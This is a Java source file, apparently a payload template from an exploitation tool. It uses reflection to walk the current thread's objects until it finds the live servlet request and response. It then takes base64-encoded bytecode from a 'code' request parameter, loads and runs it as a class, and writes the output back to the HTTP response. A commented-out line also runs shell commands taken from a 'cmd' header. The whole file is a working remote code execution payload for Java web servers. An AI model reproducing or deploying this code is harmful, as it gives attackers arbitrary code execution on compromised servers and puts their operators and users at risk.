package jeg.core.template.all;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Scanner;

public class DFSCodeExecTpl {
	static HashSet<Object> h;
	static ClassLoader cl = Thread.currentThread().getContextClassLoader();
	static Class hsr;//HTTPServletRequest.class
	static Class hsp;//HTTPServletResponse.class
	static String code;
	static Object r;
	static Object p;

	public DFSCodeExecTpl() {
		r = null;
		p = null;
		h =new HashSet<Object>();
		try {
			hsr = cl.loadClass("javax.servlet.http.HttpServletRequest");
			hsp = cl.loadClass("javax.servlet.http.HttpServletResponse");
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}

		F(Thread.currentThread(),0);
	}

	private static String getReqParamName() {
		return "code";
	}

	private static boolean i(Object obj){
		if(obj==null|| h.contains(obj)){
			return true;
		}

		h.add(obj);
		return false;
	}
	private static void p(Object o, int depth){
		if(depth > 52||(r !=null&& p !=null)){
			return;
		}
		if(!i(o)){
			if(r ==null&&hsr.isAssignableFrom(o.getClass())){
				r = o;
				//Tomcat特殊处理
				try {
					code = (String)hsr.getMethod("getParameter",new Class[]{String.class}).invoke(o,getReqParamName());
					if(code==null) {
						r = null;
					}else{
						//System.out.println("find Request");
						try {
							Method getResponse = r.getClass().getMethod("getResponse");
							p = getResponse.invoke(r);
						} catch (Exception e) {
							//System.out.println("getResponse Error");
							r=null;
							//e.printStackTrace();
						}
					}
				} catch (IllegalAccessException | InvocationTargetException e) {
					e.printStackTrace();
				} catch (NoSuchMethodException e) {
					e.printStackTrace();
				}

			}else if(p ==null&&hsp.isAssignableFrom(o.getClass())){
				p =  o;


			}
			if(r !=null&& p !=null){
				try {
					PrintWriter pw =  (PrintWriter)hsp.getMethod("getWriter").invoke(p);
					pw.println(exec(code));
					pw.flush();
					pw.close();
					//p.addHeader("out",new Scanner(Runtime.getRuntime().exec(r.getHeader("cmd")).getInputStream()).useDelimiter("\\A").next());
				}catch (Exception e){
				}
				return;
			}

			F(o,depth+1);
		}
	}

	private static String exec(String var2) {
		try {
			byte[] clazzByte = base64Decode(var2);
			Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
			defineClass.setAccessible(true);
			Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
			return clazz.newInstance().toString();
		} catch (Exception e) {
			return e.getMessage();
		}
	}

	private static byte[] base64Decode(String str) throws Exception {
		try {
			Class clazz = Class.forName("sun.misc.BASE64Decoder");
			return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
		} catch (Exception var4) {
			Class clazz = Class.forName("java.util.Base64");
			Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
			return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
		}
	}

	private static void F(Object start, int depth){

		Class n=start.getClass();
		do{
			for (Field declaredField : n.getDeclaredFields()) {
				declaredField.setAccessible(true);
				Object o = null;
				try{
					o = declaredField.get(start);

					if(!o.getClass().isArray()){
						p(o,depth);
					}else{
						for (Object q : (Object[]) o) {
							p(q, depth);
						}

					}

				}catch (Exception e){
				}
			}

		}while(
				(n = n.getSuperclass())!=null
		);
	}
}